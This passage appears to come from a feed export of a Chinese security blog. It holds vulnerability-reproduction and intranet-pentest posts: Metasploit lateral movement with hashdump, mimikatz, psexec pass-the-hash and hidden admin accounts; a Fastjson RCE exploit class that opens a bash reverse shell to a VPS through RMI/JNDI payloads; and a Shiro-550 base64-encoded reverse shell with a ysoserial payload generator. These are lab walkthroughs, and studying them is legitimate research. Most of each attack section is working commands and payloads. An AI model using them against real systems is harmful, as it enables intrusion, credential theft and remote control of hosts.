src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235621609.png" alt="image-20220318235621609"></p><pre><code>getuid 当前用户getprivs 尽可能提升权限getsystem 通过各种攻击向量来提升系统用户权限</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235905714.png" alt="image-20220318235905714"></p><p>增加管理员</p><pre><code>net user sakura$ 123456 /add &amp; net localground administrators sakura$ /add</code></pre><p>检测存活ip</p><pre><code>run post/multi/gather/ping_sweep rhosts=10.10.10.0/24run post/windows/gather/arp_scanner rhosts=10.10.10.0/24</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319000735682.png" alt="image-20220319000735682"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319000816930.png" alt="image-20220319000816930"></p><p> 增加路由表</p><pre><code>run autoroute -s 10.10.10.0/24backgrounduse auxiliary/server/socks4aset SRVHOST 192.168.0.115 #端口默认是1080exploitvim /etc/proxychains.conf</code></pre><pre><code>socks4 192.168.0.115 1080</code></pre><pre><code>proxychains nmap -sT -Pn -P 445,22,80,3306 10.10.10.130-135 --open -oN 10.10.10.0.txt</code></pre><p>445开放，尝试hash攻击</p><p>hash获取</p><pre><code>meterpreter &gt; hashdump</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319014555755.png" alt="image-20220319014555755"></p><pre><code>ues exploit/windows/smb/psexecset payload windows/meterpreter/bind_tcpset rhost 10.10.10.131set SMBUser Administratorset SMBPass 44efcexxxxxxxxxxxxxxxxxxxxxxxxexploit</code></pre><p>使用mimikatz来获取更多密码</p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #获取hash密码meterpreter &gt; run getgui -e #开启3389端口meterpreter &gt; run getgui -u sakura -p 123456 #增加用户</code></pre><pre><code>root@kali:~# proxychains rdesktop -u Administrator -p 123456 10.10.10.131 #登录3389端口</code></pre><h1 id="MSF进行一次完整的域渗透流程"><a href="#MSF进行一次完整的域渗透流程" class="headerlink" title="MSF进行一次完整的域渗透流程"></a>MSF进行一次完整的域渗透流程</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319122142921.png" alt="image-20220319122142921"></p><p>渗透前提:拿到了域客户机2008的shell</p><p>生成metaploit后门，并监听</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>运行后门，得到2008服务器反弹shell</p><p>扫描内网的机器</p><pre><code>run post/windows/gather/qrp_scanner rhosts=10.10.1.0/24</code></pre><p>加入路由</p><pre><code>backgroundroute add 10.10.1.3 255.255.255.0 1</code></pre><p>使用扫描器</p><pre><code>use scanner/portscan/tcp  #默认扫描1-10000端口set rhost 10.10.1.3exploit</code></pre><p>通过扫描发现 10.10.1.3 的3306端口存在mysql服务</p><p>进行弱口令攻击</p><pre><code>use auxiliary/scanner/mysql/mysql_loginset rhost 10.10.1.3set username rootset pass_file /root/password.txtexploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319124232296.png" alt="image-20220319124232296"></p><p>成功爆破出弱口令</p><p>尝试使用mysql_mof提权,得到域客户机2003的session</p><pre><code>use exploit/windows/mysql/mysql_mofset password 123456set rhost 10.10.1.3set username rootset payload windows/metepreter/bind_tcpexploit</code></pre><p>现在拿到了2003的系统权限，就可以使用一些命令进行信息搜集</p><pre><code>new view /domain:moonsec #查看当前域用户</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319125543944.png" alt="image-20220319125543944"></p><p>得到目标机ip</p><pre><code>ping SERVERS2003</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319125634094.png" alt="image-20220319125634094"></p><pre><code>net user /domain  #获取所有域的用户列表net group /domain #获取域用户组信息net group &quot;domain admins&quot; /domain #获取当前域管理员信息net time /domain #查看域实际及域服务器名字</code></pre><p>可以得到域控信息</p><pre><code>WIN-7230786H6KU.moonsec.com 10.10.1.2 #这个就是域控</code></pre><p>因为普通域用户 需要更改系统信息 都需要通过域管理员的操作 要输入账号密码</p><p>抓明文 mimikatz</p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #获取hash密码</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319130901701.png" alt="image-20220319130901701"></p><p>尝试能否抓明文</p><pre><code>meterpreter &gt; kerberos #获取明文密码</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319132330184.png" alt="image-20220319132330184"></p><p>现在想要获取session</p><pre><code>use exploit/windows/smb/psexecset rhost 10.10.1.2set SMBDomain moonsecset SMBUser administratorset SMBPass xxx123456..set payload windows/meterpreter/bind_tcpexploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133243629.png" alt="image-20220319133243629"></p><p>得到域控shell，但是权限不够</p><pre><code>get privsgetsystem</code></pre><p>使用uac提权</p><pre><code>use exploit/windows/local/askset sessions 3exploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133844674.png" alt="image-20220319133844674"></p><p>提权成功</p><p>获取hash密码</p><pre><code>meterpreter &gt; hashdump#或者meterpreter &gt;  run post/windows/gather/hashdump</code></pre><p>mimikatz抓明文密码</p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #获取hash密码meterpreter &gt; kerberos #获取明文密码meterpreter &gt; mimikatz_command -f samd::hashes #另一种方式获取hash值</code></pre><p>权限维持：进程注入</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133930152.png" alt="image-20220319133930152"></p><pre><code>meterpreter &gt; migrate 2804</code></pre><p>开启域控远程连接</p><pre><code>meterpreter &gt; run getgui -e</code></pre><p>使用socks4a连接3389</p><pre><code>run autoroute -s 10.10.1.0/24 255.255.255.0use auxiliary/server/socks4aset srvhost 10.10.1.2</code></pre><p>配置pxoxychains.conf</p><pre><code>vim /etc/proxychains.conf</code></pre><pre><code>....socks4 192.168.0.115 1080</code></pre><p>登录3389</p><pre><code>root@kali:~ proxychains rdesktop 10.10.1.2 #登录3389端口</code></pre><p>增加账号</p><pre><code>meterpreter &gt; run getgui -u moonsec -p moonsec</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;域的搭建&quot;&gt;&lt;a href=&quot;#域的搭建&quot; class=&quot;headerlink&quot; title=&quot;域的搭建&quot;&gt;&lt;/a&gt;域的搭建&lt;/h1&gt;&lt;p&gt;实验环境:&lt;/p&gt;
&lt;p&gt;win2008 域控       本地管理员密码:0801.com  域</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="内网" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网" scheme="https://sakurahack-y.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson漏洞复现</title>
    <link href="https://sakurahack-y.github.io/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://sakurahack-y.github.io/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-03-16T09:39:56.000Z</published>
    <updated>2022-03-16T17:49:45.638Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="https://so.csdn.net/so/search?q=Fastjson&spm=1001.2101.3001.7020">Fastjson</a>是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。具有执行效率高的特点，应用范围广泛。</p><h1 id="fastjson指纹识别"><a href="#fastjson指纹识别" class="headerlink" title="fastjson指纹识别"></a>fastjson指纹识别</h1><p>当我们在渗透测试中，抓包的时候发现返回的流量内容存在json格式时，我们就可以想它是不是使用了fastjson库</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>接着我们可以进一步进行判断</p><ol><li>根据报错信息判断</li></ol><p>发送一个post请求。发送的数据为没闭合的花括号，如果服务器没有屏蔽错误信息则会报出fastjson的信息。如果屏蔽了报错信息请看第二条</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><ol start="2"><li>利用dnslog盲打</li></ol><p>对目标发送一个POST请求，请求体内容如下。请求头添加Content-Type: application/json</p><pre><code>&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125; </code></pre><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>DNSlog刷新成功</p><h1 id="Fastjson-lt-1-2-24远程代码执行-CVE-2017-18349"><a href="#Fastjson-lt-1-2-24远程代码执行-CVE-2017-18349" class="headerlink" title="Fastjson&lt;1.2.24远程代码执行(CVE-2017-18349)"></a>Fastjson&lt;1.2.24远程代码执行(CVE-2017-18349)</h1><p><strong>漏洞详情</strong></p><p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><p><strong>漏洞版本</strong></p><p>fastjson &lt;=1.2.24</p><p><strong>漏洞分析</strong></p><p><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p><p><strong>需要环境</strong></p><p>在本机提前安装好maven和jdk</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220316235940219.png" alt="image-20220316235940219"></p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317000000186.png" alt="image-20220317000000186"></p><p><strong>漏洞复现</strong></p><p>使用vulhub搭建漏洞环境</p><pre><code class="text">docker-compose up d</code></pre><p>访问xxx:8090</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220316235812389.png" alt="image-20220316235812389"></p><p>保存以下代码</p><p>dnslog.java</p><pre><code class="java">import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader; public class Exploit&#123;    public Exploit() throws Exception &#123;        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/VPS的IP/6666 0&gt;&amp;1&quot;&#125;);        InputStream is = p.getInputStream();        BufferedReader reader = new BufferedReader(new InputStreamReader(is));         String line;        while((line = reader.readLine()) != null) &#123;            System.out.println(line);        &#125;         p.waitFor();        is.close();        reader.close();        p.destroy();    &#125;     public static void main(String[] args) throws Exception &#123;    &#125;&#125;</code></pre><p>编译为Exploit.class</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317010125235.png" alt="image-20220317010125235"></p><p>使用python在当前目录下起一个http服务，如果端口占用换其他的</p><pre><code class="text">python -m SimpleHTTPServer 4567</code></pre><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317000648363.png" alt="image-20220317000648363"></p><p>使用marshalsec项目，启动RMI服务，监听9999端口并加载远程类Exploit.class</p><pre><code class="text">git clone https://github.com/mbechler/marshalsec.gitcd marshalsec/编译项目mvn clean package -DskipTests</code></pre><p>以我搭建Exploit.class类http服务的服务器IP为2.2.2.2端口为4567</p><pre><code class="text">cd target/java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://xxx:4567/#Exploit&quot; 9999</code></pre><p>RMI服务可以搭建在与Exploit.class类的http服务同一台服务器，也可以搭建在其它服务器上。我们演示还是在同一台。</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317001425835.png" alt="image-20220317001425835"></p><p>环境已经搭建好，接下来使用burp开始</p><pre><code class="text">POST / HTTP/1.1Accept: */*Accept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; NMTE)Host: 目标ip:8090Connection: closeContent-Length: 162Content-Type: application/jsonAccept-Encoding: gzip, deflate&#123;    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://vps的ip:9999/Exploit&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre><p>如图即代表攻击成功</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317012518646.png" alt="image-20220317012518646"></p><p>RMI服务响应</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013058412.png" alt="image-20220317013058412"></p><p>python搭建的http服务响应</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013143699.png" alt="image-20220317013143699"></p><p>nc</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013212099.png" alt="image-20220317013212099"></p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013225316.png" alt="image-20220317013225316"></p><h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><p>和fastjson1.2.24差不多，就是poc不一样而已</p><p><strong>影响版本</strong></p><ul><li>fastjson&lt;=1.2.47</li></ul><p><strong>漏洞检测</strong></p><p>检测方式和1.2.24一样</p><p>漏洞利用</p><p>创建恶意类，python搭建服务</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317010125235.png" alt="image-20220317010125235"></p><p>搭建RMI服务</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317001425835.png" alt="image-20220317001425835"></p><p>发送的数据包改为即可</p><pre><code class="text">POST / HTTP/1.1Host: 192.168.140.158:8090   #靶机地址Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 263 &#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://VPS地址:端口/Exploit&quot;,  #这里的Exploit不能变        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://so.csdn.net/so/search?q=Fastjson&amp;spm=1001.2101.3001.7</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="fastjson" scheme="https://sakurahack-y.github.io/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>shiro漏洞复现</title>
    <link href="https://sakurahack-y.github.io/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://sakurahack-y.github.io/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-03-15T09:11:24.000Z</published>
    <updated>2022-03-15T12:30:46.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><h1 id="Shiro-rememberMe反序列化漏洞（Shiro-550）"><a href="#Shiro-rememberMe反序列化漏洞（Shiro-550）" class="headerlink" title="Shiro rememberMe反序列化漏洞（Shiro-550）"></a>Shiro rememberMe反序列化漏洞（Shiro-550）</h1><p><strong>影响版本:Apache Shiro &lt; 1.2.4</strong></p><p><strong>漏洞原理：</strong>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。那么，Payload产生的过程：<br>命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值<br>在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。</p><p><strong>特征判断</strong></p><p>返回包中包含rememberMe=deleteMe字段。</p><p><strong>环境搭建</strong></p><pre><code class="text">获取docker镜像docker pull medicean/vulapps:s_shiro_1启动docker镜像：docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1</code></pre><p><strong>工具准备</strong></p><p>maven配置:</p><pre><code class="text">sudo wget  https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gztar -zxvf apache-maven-3.6.3-bin.tar.gzsudo mv apache-maven-3.6.3 /usr/local/maven3在/etc/profile末尾添加maven环境变量:export M2_HOME=/usr/local/maven3export PATH=$PATH:$JAVA_HOME/bin:$M2_HOME/binsource /etc/profile</code></pre><p>下载ysoserial并打包:</p><pre><code class="text">git clone https://github.com/frohoff/ysoserial.gitcd ysoserialmvn package -D skipTests</code></pre><p>生成的工具在ysoserial/target文件中。</p><p><strong>复现流程</strong></p><p><strong>1、检查是否存在默认的key</strong></p><p>推荐使用Shiro_exploit检测:<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181209641.png" alt="image-20220315181209641"></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181335231.png" alt="image-20220315181335231"></p><p>如图成功获取密钥</p><p><strong>2、nc监听本地端口</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181502656.png" alt="image-20220315181502656"></p><p><strong>3、编写反弹shell代码</strong></p><pre><code class="text">bash -i &gt;&amp; /dev/tcp/192.168.172.133/1234 0&gt;&amp;1#进行base64编码bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></pre><p><strong>4、通过ysoserial中JRMP监听模块，监听5555端口并执行反弹shell命令。</strong></p><pre><code class="text">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 5555 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315185158472.png" alt="image-20220315185158472"></p><p><strong>5、使用shiro.py生成payload</strong></p><pre><code class="text">import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command):    popen = subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;JRMPClient&#39;, command], stdout=subprocess.PIPE)    BS = AES.block_size    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)    iv = uuid.uuid4().bytes    encryptor = AES.new(key, AES.MODE_CBC, iv)    file_body = pad(popen.stdout.read())    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    return base64_ciphertextif __name__ == &#39;__main__&#39;:    payload = encode_rememberme(sys.argv[1])   print &quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315192829289.png" alt="image-20220315192829289"></p><p>ps:注意shiro.py要在target目录下</p><p><strong>6、构造数据包，伪造cookie，发送Payload</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200340397.png" alt="image-20220315200340397"></p><p>用上文产生的payload进行替换</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200402486.png" alt="image-20220315200402486"></p><p>发送</p><p><strong>7、成功反弹shell</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200453881.png" alt="image-20220315200453881"></p><h1 id="Shiro-Padding-Oracle-Attack（Shiro-721）"><a href="#Shiro-Padding-Oracle-Attack（Shiro-721）" class="headerlink" title="Shiro Padding Oracle Attack（Shiro-721）"></a>Shiro Padding Oracle Attack（Shiro-721）</h1><p><strong>漏洞原理</strong></p><p>由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding  Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。<br>影响版本：Apache Shiro &lt; 1.4.2版本。</p><p><strong>漏洞利用：</strong><br>1、登录Shiro网站，从cookie中获得rememberMe字段的值。</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113116568-425378550.png" alt="img"><br>2、利用DNSlog探测，通过ysoserial工具payload。</p><pre><code class="text">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping 75bbot.dnslog.cn&quot; &gt; payload.class</code></pre><p>3、使用rememberMe值作为prefix，加载Payload，进行Padding Oracle攻击。<br>github项目地址：<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721">https://github.com/longofo/PaddingOracleAttack-Shiro-721</a><br>使用示例：</p><pre><code class="text">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113145995-1951867126.png" alt="img"><br>爆破成功，输出Result：</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113200234-980599342.png" alt="img"></p><p>4、使用构造的rememberMe攻击字符串重新请求网站<img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113217346-911399190.png" alt="img"></p><p>5、成功触发Payload，在DNSLog获取到目标IP。<img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113226312-979603878.png" alt="img"></p><h1 id="一键自动化漏洞利用工具"><a href="#一键自动化漏洞利用工具" class="headerlink" title="一键自动化漏洞利用工具"></a>一键自动化漏洞利用工具</h1><p>ShiroExploit：支持对Shiro-550（硬编码秘钥）和Shiro-721（Padding Oracle）的一键化检测，支持简单回显。<br>Github项目地址：<a href="https://github.com/feihong-cs/ShiroExploit">https://github.com/feihong-cs/ShiroExploit</a></p><p>Shiro-550，只需输入url，即可完成自动化检测和漏洞利用。</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113422921-1885042148.png" alt="img"></p><p>Shiro-721，需输入url，提供一个有效的rememberMe Cookie，并指定目标操作系统类型。</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113437704-589381400.png" alt="img"></p><p>参考链接:<a href="https://www.cnblogs.com/xiaozi/p/13239046.html">https://www.cnblogs.com/xiaozi/p/13239046.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="shrio" scheme="https://sakurahack-y.github.io/tags/shrio/"/>
    
  </entry>
  
  <entry>
    <title>windows提权总结</title>
    <link href="https://sakurahack-y.github.io/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</id>
    <published>2022-03-12T13:09:18.000Z</published>
    <updated>2022-03-12T17:28:24.082Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>为什么要提权：当成功通过80或者443端口通过web服务渗透时，常常是www-data 。无法执行管理员权限下的一下命令或者读取一些重要文件。这个时候就需要提权，在管理员权限下，还可以通过msfvenom生成其他后门文件或者一些隐藏后门。添加用户，开启其他端口等操作，达到权限持续控制。特别是windows存在域，所以需要最高权限，更方便后续的渗透。</p><p>提权可分为纵向提权与横向提权：纵向提权：低权限角色获得高权限角色的权限；横向提权：获取同级别角色的权限。</p><p>Windows常用的提权方法有：系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、WEB中间件漏洞提权、DLL劫持提权、滥用高危权限令牌提权、第三方软件/服务提权等</p><h1 id="常规信息搜集"><a href="#常规信息搜集" class="headerlink" title="常规信息搜集"></a>常规信息搜集</h1><p>知己知彼，百战不殆</p><p>当以低权用户进去一个陌生的windows机器后，无论是提权还是后续做什么，第一步肯定要尽可能的搜集信息。</p><h2 id="常规信息搜集-1"><a href="#常规信息搜集-1" class="headerlink" title="常规信息搜集"></a>常规信息搜集</h2><pre><code class="text">systeminfo 查询系统信息  hostname 主机名  net user 查看用户信息  netstat -ano|find &quot;3389&quot; 查看服务pid号 